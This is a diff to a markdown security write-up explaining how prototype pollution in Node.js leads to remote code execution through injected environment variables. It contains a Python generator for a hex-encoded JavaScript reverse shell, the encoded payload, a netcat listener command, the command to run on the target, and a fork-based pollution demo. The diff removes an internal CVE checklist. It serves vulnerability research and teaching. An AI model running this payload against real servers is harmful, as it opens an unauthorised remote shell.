@@ -285,8 +285,9 @@ Since we can execute arbitrary JavaScript code by injecting environment variable
 
 We can replace the ```HOST``` and ```PORT``` details in the above code and encode the entire exploit into hexadecimal format. Doing so, would allow us to easily deliver the exploit to the remote target.
 
-The following Python code takes care of replacing the details, taken through command line arguments, encode the exploit payload into hexadecimal and output the value that needs to be placed in the first environment variable to execute the exploit on remote target.
+The following **Python** code takes care of replacing those details, taken through command line arguments, encode the exploit payload into hexadecimal format and output the value that needs to be placed in the first environment variable to execute the exploit on remote target.
 
+```python
 import sys
 
 host = sys.argv[1]
@@ -311,32 +312,35 @@ payload = payload.encode('utf-8').hex()
 final_env = 'eval(new Buffer("{{PAYLOAD}}", "hex").toString());//'.replace('{{PAYLOAD}}', payload)
 
 print('PAYLOAD:\n', final_env)
+```
 
-The following section shows how we can use the above Python exploit generator to generate exploit and use it as a value of the environment variable.
+The following section shows how we can use the above **Python** exploit generator to generate exploit and use it as a value in the first environment variable.
 
-/* Generate exploit */
-$[REMOTE_NETCAT_HOST]> python3 payload_maker.py 192.168.10.10 1773
+```bash
+### GENERATE EXPLOIT ###
+$[PUBLIC_NETCAT_SERVER]> python3 payload_maker.py ${PUBLIC_NETCAT_SERVER_HOSTNAME} ${PUBLIC_NETCAT_SERVER_PORT}
 PAYLOAD:
  eval(new Buffer("2866756e6374696f6e28297b0a20202020766172206e6574203d207265717569726528226e657422292c0a20202020202020206370203d207265717569726528226368696c645f70726f6365737322292c0a20202020202020207368203d2063702e737061776e28222f62696e2f62617368222c205b5d293b0a2020202076617220636c69656e74203d206e6577206e65742e536f636b657428293b0a20202020636c69656e742e636f6e6e65637428313737332c20223139322e3136382e31302e3130222c2066756e6374696f6e28297b0a2020202020202020636c69656e742e706970652873682e737464696e293b0a202020202020202073682e7374646f75742e7069706528636c69656e74293b0a202020202020202073682e7374646572722e7069706528636c69656e74293b0a202020207d293b0a2020202072657475726e202f612f3b202f2f2050726576656e747320746865204e6f64652e6a73206170706c69636174696f6e20666f726d206372617368696e670a7d2928293b0a", "hex").toString());//
 
-/* Start netcat */
-$[REMOTE_NETCAT_HOST]> nc -lvp 1773
+### START NETCAT SERVER ###
+$[PUBLIC_NETCAT_SERVER]> nc -lvp 1773
 
-/* On remote target, execute the following */
+### ON THE REMOTE TARGET, EXECUTE THE FOLLOWING ###
 $[REMOTE_TARGET]> RANDOM='eval(new Buffer("2866756e6374696f6e28297b0a20202020766172206e6574203d207265717569726528226e657422292c0a20202020202020206370203d207265717569726528226368696c645f70726f6365737322292c0a20202020202020207368203d2063702e737061776e28222f62696e2f62617368222c205b5d293b0a2020202076617220636c69656e74203d206e6577206e65742e536f636b657428293b0a20202020636c69656e742e636f6e6e65637428313737332c20223139322e3136382e31302e3130222c2066756e6374696f6e28297b0a2020202020202020636c69656e742e706970652873682e737464696e293b0a202020202020202073682e7374646f75742e7069706528636c69656e74293b0a202020202020202073682e7374646572722e7069706528636c69656e74293b0a202020207d293b0a2020202072657475726e202f612f3b202f2f2050726576656e747320746865204e6f64652e6a73206170706c69636174696f6e20666f726d206372617368696e670a7d2928293b0a", "hex").toString());//' NODE_OPTIONS='--require /proc/self/environ' node
+```
 
-If the above steps are executed in a correct environment, a reverse shell should open up.
+If the above steps are executed in a correct environment, a reverse shell should open up on your Netcat server.
 
-Now that we've achieved a complete reverse shell, let's put together a complete and meaningful program that is exploitable. Before we do that, we have to understand a basic difference between spawn and fork functions in child_process module.
+Now that we've achieved a complete reverse shell, let's put together a complete and meaningful program that is exploitable. Before we do that, we have to understand a basic difference between ```spawn``` and ```fork``` functions in ```child_process``` module.
 
-The spawn command is a command designed to run any arbitrary shell instructions. When you run spawn, you send it a shell command or instruction that will be run as its own process, but does not execute any further code within your parent node process. You can add listeners for the process you have spawned, to allow your code interact with the spawned process, but no new V8 instance is created (unless of course if your command is creating another node process, but in this case you should use fork!) and only one instance of V8 runtime will be running on the processor.
+The ```spawn``` command is a command designed to run any arbitrary shell instructions. When you run ```spawn```, you send it a shell command or instruction that will be run as its own process, but does not execute any further code within your parent ```node``` process. You can add listeners for the process you have spawned, to allow your code interact with the spawned process, but no new V8 instance is created (unless of course if your command is creating another ```node``` process, but in this case you should use ```fork```!) and only one instance of V8 runtime will be running on the processor.
 
-The fork command is a special case of spawn, that runs a fresh instance of the V8 runtime engine. Meaning, you create multiple other V8 worker processes from the original V8 parent process. This is most useful for creating a worker pool. While Node.js' async event model allows a single core of a machine to be used fairly efficiently, it doesn't allow a node process to make use of multiple cores of a processor. Easiest way to accomplish this is to run multiple copies of the same program, on a single multi-core processor.
+The ```fork``` command is a special case of ```spawn```, that runs a fresh instance of the V8 runtime engine. Meaning, you create multiple other V8 worker processes from the original V8 parent process. This is most useful for creating a worker pool. While Node.js' ```async``` event model allows a single core of a machine to be used fairly efficiently, it doesn't allow a node process to make use of multiple cores of a processor. Easiest way to accomplish this is to run multiple copies of the same program, on a single multi-core processor.
 
 Therefore, we should technically be able to inject the two environment variables for achieving RCE through prototype pollution as explained above. And if there a fork call anywhere in the codebase, which is triggerable, that code injected through the environment variable will be executed on the remote server.
 
 To confirm the same, see the following code:
-
+```javascript
 // Pollute prototype with env
 let object = {}
 object.__proto__.env = { RANDOM: 'console.log(123)//', NODE_OPTIONS: '--require /proc/self/environ' };
@@ -353,31 +357,14 @@ if (process.argv[2] == 'child') {
 // $> node fork_proto_env.js 
 // 123
 // Hello from child!
+```
 
-Security Assessment
+## Bibliography
 
-Issues that are present in the Node.js platform itself that can potentially affect our security
+- [Research on CVE-2019-7609 in Kibana Timelion](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
+- [The child process API](https://nodejs.org/api/child_process.html)
+- [Inheritance and prototype chain](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)
 
-    https://nvd.nist.gov/vuln/detail/CVE-2022-32213
-    https://nvd.nist.gov/vuln/detail/CVE-2022-32214
-    https://nvd.nist.gov/vuln/detail/CVE-2022-32215
-
-Check whether the above CVEs affect PingOne DaVinci or not.
-
-July 7th, 2022 Security Releases - https://nodejs.org/en/blog/vulnerability/july-2022-security-releases/
-
-Update [19th October, 2022]: Nicholas Lescanic has filed a ticket for the above three CVEs -
-Bibliography
-
-Research on CVE-2019-7609 in Kibana Timelion: https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
-
-The child process API: https://nodejs.org/api/child_process.html
-
-Inheritance and prototype chain: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Inheritance_and_the_prototype_chain
-
-Relevant links for good read:
-
-    https://www.vaadata.com/blog/node-js-common-vulnerabilities-security-best-practices/
-    https://portswigger.net/daily-swig/node-js-fixes-multiple-bugs-that-could-lead-to-rce-http-request-smuggling
-
- 
+- Relevant links for good read:
+  - https://www.vaadata.com/blog/node-js-common-vulnerabilities-security-best-practices/
+  - https://portswigger.net/daily-swig/node-js-fixes-multiple-bugs-that-could-lead-to-rce-http-request-smuggling
